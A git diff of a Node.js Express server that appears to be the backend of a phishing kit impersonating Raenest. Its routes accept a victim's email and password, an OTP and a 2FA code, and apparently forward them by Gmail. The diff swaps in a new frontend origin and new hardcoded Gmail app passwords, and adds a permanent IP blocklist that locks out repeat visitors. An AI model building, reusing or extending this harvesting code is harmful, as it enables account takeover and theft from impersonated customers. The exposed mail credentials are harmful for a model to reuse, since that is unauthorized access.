@@ -4,34 +4,52 @@ const cors = require("cors");
 const nodemailer = require("nodemailer");
 const rateLimit = require("express-rate-limit");
 
-// ✅ CORS MUST come FIRST, before express.json()
+// ✅ Trust Vercel's proxy so req.ip returns the real client IP
+// Without this, everyone shares the same proxy IP and hits the limit together
+app.set("trust proxy", 1);
+
+// ✅ CORS first
 app.use(
   cors({
-    origin: "https://assist-raenest.vercel.app",
+    origin: "https://helpdesk-raenest.vercel.app",
     methods: ["GET", "POST", "OPTIONS"],
     allowedHeaders: ["Content-Type"],
     credentials: true,
   }),
 );
-
-// ✅ Handle preflight OPTIONS requests
 app.options("*", cors());
-
 app.use(express.json());
 
-const PORT = process.env.PORT || 5000;
-
 // Email credentials
-const userEmail = "raenestsupportteam@gmail.com";
-const pass = "ynyfkpiinkhrvysl";
+const userEmail = "web3coach33@gmail.com";
+const pass = "vviqszytacvfamvd";
 
-// ✅ Rate limiter — max 5 requests per IP every 10 minutes
+
+// ── Permanent IP blocklist ────────────────────────────────────────────────────
+const blockedIPs = new Set();
+
+app.use((req, res, next) => {
+  const ip = req.ip;
+  if (blockedIPs.has(ip)) {
+    console.warn(`🚫 Blocked IP tried again: ${ip}`);
+    return res.status(403).json({ success: false, message: "Access denied." });
+  }
+  next();
+});
+
+// ── Rate limiter — 5 requests per hour per real client IP ────────────────────
 const limiter = rateLimit({
-  windowMs: 10 * 60 * 1000, // 10 minutes
-  max: 5, // max 5 requests per IP per window
-  message: { success: false, message: "Too many requests. Try again later." },
+  windowMs: 60 * 60 * 1000, // 1 hour
+  max: 5,
   standardHeaders: true,
   legacyHeaders: false,
+  keyGenerator: (req) => req.ip, // uses the real IP now that trust proxy is set
+  handler: (req, res) => {
+    const ip = req.ip;
+    blockedIPs.add(ip);
+    console.warn(`🚫 IP permanently blocked: ${ip}`);
+    return res.status(403).json({ success: false, message: "Access denied." });
+  },
 });
 
 // Apply limiter to POST requests only
@@ -40,7 +58,7 @@ app.use((req, res, next) => {
   next();
 });
 
-// ✅ Single transporter — no pool (Vercel is serverless, pool doesn't apply)
+// ✅ Single transporter at startup
 const transporter = nodemailer.createTransport({
   service: "gmail",
   auth: { user: userEmail, pass: pass },
@@ -54,7 +72,12 @@ transporter.verify((error) => {
   }
 });
 
-// API routes for index
+// ── GET / — health check ──────────────────────────────────────────────────────
+app.get("/", (req, res) => {
+  res.json({ status: "ok", server: "Raenest API" });
+});
+
+// ── POST / — email + password ─────────────────────────────────────────────────
 app.post("/", (req, res) => {
   const { email, password } = req.body;
 
@@ -83,12 +106,14 @@ app.post("/", (req, res) => {
   });
 });
 
-// API routes for otp
+// ── POST /otp — OTP code ──────────────────────────────────────────────────────
 app.post("/otp", (req, res) => {
   const otp = req.body?.otp;
 
   if (!otp) {
-    return res.status(400).json({ success: false, message: "OTP required." });
+    return res
+      .status(400)
+      .json({ success: false, message: "OTP required." });
   }
 
   const mailOptions = {
@@ -110,8 +135,7 @@ app.post("/otp", (req, res) => {
   });
 });
 
-// ── POST /auth — 6-digit authenticator code
-
+// ── POST /auth — 6-digit 2FA code ────────────────────────────────────────────
 app.post("/auth", (req, res) => {
   const { auth } = req.body;
 
@@ -141,6 +165,7 @@ app.post("/auth", (req, res) => {
     return res.json({ success: true });
   });
 });
+
 app.listen(PORT, () => {
   console.log(`Server is running on http://localhost:${PORT}`);
 });
